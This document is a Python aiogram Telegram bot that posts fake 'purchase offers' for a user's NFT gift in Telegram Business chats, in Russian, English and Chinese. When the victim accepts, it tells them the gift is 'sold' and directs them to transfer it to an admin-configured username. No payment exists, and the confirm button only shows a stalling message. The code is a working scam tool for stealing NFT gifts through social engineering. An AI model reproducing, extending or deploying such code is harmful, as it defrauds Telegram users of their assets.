import asyncio
import logging
import os
import aiosqlite
from aiohttp import web

from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    Message, CallbackQuery, LinkPreviewOptions
)
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
ADMIN_ID = int(os.getenv("ADMIN_ID", 123456789))
WEBHOOK_HOST = os.getenv("RENDER_EXTERNAL_URL", "")
WEBHOOK_PATH = "/webhook"
WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
PORT = int(os.getenv("PORT", 8080))
DB_NAME = "bot_database.db"

active_offers = {}

LOCALES = {
    "ru": {
        "offer": "Пользователь <b>{giver}</b> предлагает\nВам <b>{amount}</b> {star} звёзд за подарок\n<b>{link_html}</b>.\n\nПредложение действует ещё 6ч.",
        "decline_btn": "Отклонить",
        "accept_btn": "Принять",
        "decline_text": "❌ <b>Предложение отклонено.</b>",
        "accept_alert": "После принятия следуйте инструкциям бота для дальнейших действий.\n\nЕсли вы всё прочитали и ознакомились, нажмите «ОК».",
        "sold_text": "{gift} Подарок: <b>{nft_name}</b>\nуспешно продан!\n\n<b>Передайте подарок</b>\n<b>покупателю для зачисления</b>\n<b>звёзд.</b>",
        "transfer_btn": "Передать NFT",
        "how_to_btn": "Как передать?",
        "instruction_text": "<b>Инструкция для завершения сделки:</b>\n1. Передайте подарок пользователю\n@{target}.\n2. Нажмите «Передать подарок» и\nвыберите <b>{nft_name}</b>.\n3. Подтвердите передачу подарка.\n\nПредложение действительно 24 часа.",
        "confirm_btn": "Подтвердить передачу",
        "confirm_alert": "{clock} Подарок пока не найден на аккаунте. Ожидайте автоматической проверки."
    },
    "eng": {
        "offer": "User <b>{giver}</b> offers\nYou <b>{amount}</b> {star} stars for the gift\n<b>{link_html}</b>.\n\nOffer is valid for 6 hours.",
        "decline_btn": "Decline",
        "accept_btn": "Accept",
        "decline_text": "❌ <b>Offer declined.</b>",
        "accept_alert": "After accepting, follow the bot's instructions for further actions.\n\nIf you have read and understood everything, click «OK».",
        "sold_text": "{gift} Gift: <b>{nft_name}</b>\nsuccessfully sold!\n\n<b>Transfer the gift</b>\n<b>to the buyer to credit</b>\n<b>stars.</b>",
        "transfer_btn": "Transfer NFT",
        "how_to_btn": "How to transfer?",
        "instruction_text": "<b>Instructions to complete the deal:</b>\n1. Transfer the gift to the user\n@{target}.\n2. Click «Transfer gift» and\nselect <b>{nft_name}</b>.\n3. Confirm the gift transfer.\n\nOffer is valid for 24 hours.",
        "confirm_btn": "Confirm transfer",
        "confirm_alert": "{clock} Gift not found on the account yet. Please wait for automatic verification."
    },
    "cn": {
        "offer": "用户 <b>{giver}</b> 向您提议\n用 <b>{amount}</b> {star} 星币购买礼物\n<b>{link_html}</b>。\n\n提议有效期为 6 小时。",
        "decline_btn": "拒绝",
        "accept_btn": "接受",
        "decline_text": "❌ <b>提议已拒绝。</b>",
        "accept_alert": "接受后，请按照机器人的指示进行后续操作。\n\n如果您已阅读并了解所有内容，请点击“确定”。",
        "sold_text": "{gift} 礼物：<b>{nft_name}</b>\n已成功售出！\n\n<b>请将礼物转移给</b>\n<b>买家以计入</b>\n<b>星币。</b>",
        "transfer_btn": "转移 NFT",
        "how_to_btn": "如何转移？",
        "instruction_text": "<b>完成交易的指示：</b>\n1. 将礼物转移给用户\n@{target}。\n2. 点击“转移礼物”并\n选择 <b>{nft_name}</b>。\n3. 确认礼物转移。\n\n提议有效期为 24 小时。",
        "confirm_btn": "确认转移",
        "confirm_alert": "{clock} 账户上尚未找到礼物。请等待自动验证。"
    }
}

DEFAULT_EMOJIS = {
    "star": ["⭐", None], "gift": ["🎁", None], "decline": ["❌", None], "accept": ["✅", None],
    "transfer": ["➡️", None], "how_to": ["❓", None], "confirm": ["✅", None], "help_doc": ["📄", None],
    "ru_flag": ["🇷🇺", None], "eng_flag": ["🇬🇧", None], "cn_flag": ["🇨🇳", None], "tools": ["🛠", None], "clock": ["⏳", None]
}

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        await db.execute('''CREATE TABLE IF NOT EXISTS templates (id INTEGER PRIMARY KEY AUTOINCREMENT, text TEXT)''')
        await db.execute('''CREATE TABLE IF NOT EXISTS emojis (key TEXT PRIMARY KEY, emoji_id TEXT)''')
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('target_username', 'Gifter_Manager')")
        await db.commit()

async def get_setting(key: str):
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else None

async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
        await db.commit()

async def get_emoji_id(key: str):
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT emoji_id FROM emojis WHERE key = ?", (key,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row and row[0] else None

async def get_emoji_text(key: str):
    emoji_id = await get_emoji_id(key)
    fallback = DEFAULT_EMOJIS[key][0]
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

async def get_button_emoji(key: str):
    return await get_emoji_id(key)

# --- СОСТОЯНИЯ FSM ---
class AdminStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_emoji_id = State()
    waiting_for_template = State()

# --- ИНИЦИАЛИЗАЦИЯ ---
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)  # <--- ОЧЕНЬ ВАЖНО! БЕЗ ЭТОЙ СТРОКИ БОТ НЕ БУДЕТ ВИДЕТЬ КОМАНДЫ

# --- ГЕНЕРАТОРЫ КЛАВИАТУР ---
async def get_offer_keyboard(lang: str):
    decline_id = await get_button_emoji("decline")
    accept_id = await get_button_emoji("accept")
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=LOCALES[lang]['decline_btn'], callback_data=f"decline:{lang}", icon_custom_emoji_id=decline_id),
            InlineKeyboardButton(text=LOCALES[lang]['accept_btn'], callback_data=f"accept:{lang}", icon_custom_emoji_id=accept_id)
        ]
    ])

async def get_success_keyboard(lang: str, target_username: str):
    transfer_id = await get_button_emoji("transfer")
    how_to_id = await get_button_emoji("how_to")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LOCALES[lang]['transfer_btn'], url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
        [InlineKeyboardButton(text=LOCALES[lang]['how_to_btn'], callback_data=f"how_to:{lang}", icon_custom_emoji_id=how_to_id)]
    ])

async def get_instruction_keyboard(lang: str, target_username: str):
    transfer_id = await get_button_emoji("transfer")
    confirm_id = await get_button_emoji("confirm")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LOCALES[lang]['transfer_btn'], url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
        [InlineKeyboardButton(text=LOCALES[lang]['confirm_btn'], callback_data=f"confirm:{lang}", icon_custom_emoji_id=confirm_id)]
    ])

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить юзернейм получателя", callback_data="admin_set_user")],
        [InlineKeyboardButton(text="Управление премиум-эмодзи", callback_data="admin_emojis")],
        [InlineKeyboardButton(text="Создать шаблон (.shab)", callback_data="admin_create_tpl")]
    ])

# --- ОБРАБОТЧИКИ КОМАНД ---

# Команда /start (работает и в ЛС, и в бизнес-чатах)
@router.message(Command("start"))
@router.business_message(Command("start"))
async def cmd_start(message: Message):
    await message.answer("👋 <b>Бот запущен и готов к работе!</b>\n\nДля получения инструкции введите <code>.help</code>")

# Команда .help (работает и в ЛС, и в бизнес-чатах)
@router.message(F.text == ".help")
@router.business_message(F.text == ".help")
async def show_help(message: Message):
    e_doc = await get_emoji_text("help_doc")
    e_ru = await get_emoji_text("ru_flag")
    e_eng = await get_emoji_text("eng_flag")
    e_cn = await get_emoji_text("cn_flag")
    e_tools = await get_emoji_text("tools")
    
    text = (
        f"{e_doc} <b>Инструкция по созданию предложения</b>\n\n"
        "Отправь команду в подключённом чате Telegram Business в следующем формате:\n\n"
        "<code>.buy язык ссылка сумма валюта</code>\n\n"
        f"{e_ru} <b>Пример на русском:</b>\n"
        "<code>.buy ru https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        f"{e_eng} <b>Пример на английском:</b>\n"
        "<code>.buy eng https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        f"{e_cn} <b>Пример на китайском:</b>\n"
        "<code>.buy cn https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        f"{e_tools} <b>Параметры:</b>\n"
        "• <code>ru</code> — русский язык\n"
        "• <code>eng</code> — английский язык\n"
        "• <code>cn</code> — китайский язык\n"
        "• <code>ссылка</code> — ссылка на подарок\n"
        "• <code>1500</code> — сумма предложения\n"
        "• <code>stars</code> — валюта Stars\n"
        "• <code>gram</code> — валюта GRAM\n\n"
        "Или используйте шаблон:\n"
        "<code>.shab [номер]</code>"
    )
    await message.answer(text) # answer работает и в бизнес-чатах (отправляет от вашего имени)

@router.business_message(F.text.startswith(".buy"))
async def process_buy_command(message: Message):
    args = message.text.split()
    if len(args) < 5:
        await message.reply("❌ Неверный формат / Invalid format. Используйте <code>.buy ru/eng/cn [ссылка] [сумма] [валюта]</code>")
        return
    
    lang, link, amount, currency = args[1].lower(), args[2], args[3], args[4]
    if lang not in LOCALES:
        lang = "ru"

    nft_name = link.split("/")[-1].replace("-", " #") if "/" in link else "NFT"
    link_html = f'<a href="{link}">{nft_name}</a>'
    
    active_offers[message.message_id] = nft_name
    
    e_star = await get_emoji_text("star")
    giver_username = message.from_user.username or message.from_user.first_name
    
    text = LOCALES[lang]['offer'].format(
        giver=giver_username, amount=amount, star=e_star, link_html=link_html
    )
    
    link_preview = LinkPreviewOptions(url=link, show_above_text=True)
    
    await message.reply(text, reply_markup=await get_offer_keyboard(lang), link_preview_options=link_preview)
    try:
        await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception:
        pass

# --- ОБРАБОТЧИКИ КНОПОК ---
@router.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    lang = callback.data.split(":")[1]
    await callback.message.edit_text(text=LOCALES[lang]['decline_text'], reply_markup=None)
    await callback.answer("❌")

@router.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    lang = callback.data.split(":")[1]
    await callback.answer(LOCALES[lang]['accept_alert'], show_alert=True)
    
    nft_name = active_offers.get(callback.message.message_id, "NFT")
    target_username = await get_setting("target_username")
    e_gift = await get_emoji_text("gift")
    
    text = LOCALES[lang]['sold_text'].format(gift=e_gift, nft_name=nft_name)
    await callback.message.edit_text(text, reply_markup=await get_success_keyboard(lang, target_username))

@router.callback_query(F.data.startswith("how_to:"))
async def how_to_transfer(callback: CallbackQuery):
    lang = callback.data.split(":")[1]
    nft_name = active_offers.get(callback.message.message_id, "NFT")
    target_username = await get_setting("target_username")
    
    text = LOCALES[lang]['instruction_text'].format(target=target_username, nft_name=nft_name)
    await callback.message.edit_text(text, reply_markup=await get_instruction_keyboard(lang, target_username))

@router.callback_query(F.data.startswith("confirm:"))
async def confirm_transfer(callback: CallbackQuery):
    lang = callback.data.split(":")[1]
    e_clock = await get_emoji_text("clock")
    
    await callback.answer(
        LOCALES[lang]['confirm_alert'].format(clock=e_clock),
        show_alert=True
    )

# --- АДМИН ПАНЕЛЬ ---
@router.message(Command("admin"), F.from_user.id == ADMIN_ID)
async def admin_panel(message: Message):
    await message.answer("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())

@router.callback_query(F.data == "admin_set_user", F.from_user.id == ADMIN_ID)
async def admin_set_user(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите новый юзернейм получателя (без @):")
    await state.set_state(AdminStates.waiting_for_username)
    await callback.answer()

@router.message(AdminStates.waiting_for_username, F.from_user.id == ADMIN_ID)
async def process_username(message: Message, state: FSMContext):
    await set_setting("target_username", message.text)
    await message.answer(f"✅ Юзернейм изменен на @{message.text}")
    await state.clear()

@router.callback_query(F.data == "admin_emojis", F.from_user.id == ADMIN_ID)
async def admin_emojis_menu(callback: CallbackQuery):
    kb = []
    for key, (fallback, _) in DEFAULT_EMOJIS.items():
        e_id = await get_emoji_id(key)
        status = "✅ Вкл" if e_id else "❌ Выкл"
        kb.append([InlineKeyboardButton(text=f"{fallback} {key} — {status}", callback_data=f"edit_emoji_{key}")])
    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
    await callback.message.edit_text("Управление премиум-эмодзи:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await callback.answer()

@router.callback_query(F.data.startswith("edit_emoji_"), F.from_user.id == ADMIN_ID)
async def edit_emoji(callback: CallbackQuery, state: FSMContext):
    key = callback.data.split("_")[2]
    fallback = DEFAULT_EMOJIS[key][0]
    await state.update_data(emoji_key=key)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑 Отключить (сбросить)", callback_data=f"reset_emoji_{key}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_emojis")]
    ])
    
    await callback.message.edit_text(
        f"Настройка эмодзи: {fallback}\n\n"
        "Отправьте ID премиум-эмодзи (только цифры), чтобы включить его.\n"
        "Или нажмите кнопку ниже, чтобы отключить и вернуть обычный эмодзи.", 
        reply_markup=kb
    )
    await state.set_state(AdminStates.waiting_for_emoji_id)
    await callback.answer()

@router.callback_query(F.data.startswith("reset_emoji_"), F.from_user.id == ADMIN_ID)
async def reset_emoji(callback: CallbackQuery, state: FSMContext):
    key = callback.data.split("_")[2]
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("DELETE FROM emojis WHERE key = ?", (key,))
        await db.commit()
    await callback.answer("✅ Эмодзи отключен!")
    await admin_emojis_menu(callback)

@router.message(AdminStates.waiting_for_emoji_id, F.from_user.id == ADMIN_ID)
async def process_emoji_id(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ ID должен состоять только из цифр. Попробуйте еще раз.")
        return
        
    data = await state.get_data()
    key = data.get("emoji_key")
    
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR REPLACE INTO emojis (key, emoji_id) VALUES (?, ?)", (key, message.text))
        await db.commit()
        
    await message.answer(f"✅ Премиум-эмодзи для '{key}' успешно обновлен!\nТеперь он включен.", reply_markup=get_admin_keyboard())
    await state.clear()

@router.callback_query(F.data == "admin_back", F.from_user.id == ADMIN_ID)
async def admin_back(callback: CallbackQuery):
    await callback.message.edit_text("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())

@router.callback_query(F.data == "admin_create_tpl", F.from_user.id == ADMIN_ID)
async def admin_create_tpl(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите текст шаблона (можно использовать HTML):")
    await state.set_state(AdminStates.waiting_for_template)
    await callback.answer()

@router.message(AdminStates.waiting_for_template, F.from_user.id == ADMIN_ID)
async def process_template(message: Message, state: FSMContext):
    async with aiosqlite.connect(DB_NAME) as db:
        cursor = await db.execute("INSERT INTO templates (text) VALUES (?)", (message.html_text,))
        tpl_id = cursor.lastrowid
        await db.commit()
    await message.answer(f"✅ Шаблон создан! Чтобы вызвать его, напишите в бизнес-чат:\n<code>.shab {tpl_id}</code>", reply_markup=get_admin_keyboard())
    await state.clear()

@router.business_message(F.text.startswith(".shab"))
async def process_shab_command(message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.reply("❌ Укажите номер шаблона: <code>.shab 1</code>")
        return
    
    tpl_id = args[1]
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT text FROM templates WHERE id = ?", (tpl_id,)) as cursor:
            row = await cursor.fetchone()
            
    if row:
        await message.reply(row[0], parse_mode=ParseMode.HTML)
    else:
        await message.reply("❌ Шаблон с таким номером не найден.")

# --- ВЕБХУК ДЛЯ RENDER ---
async def on_startup(bot: Bot):
    await init_db()
    if WEBHOOK_HOST:
        await bot.set_webhook(WEBHOOK_URL)
        logging.info(f"Webhook set to {WEBHOOK_URL}")

async def on_shutdown(bot: Bot):
    if WEBHOOK_HOST:
        await bot.delete_webhook()

def main():
    logging.basicConfig(level=logging.INFO)
    app = web.Application()
    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    web.run_app(app, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()
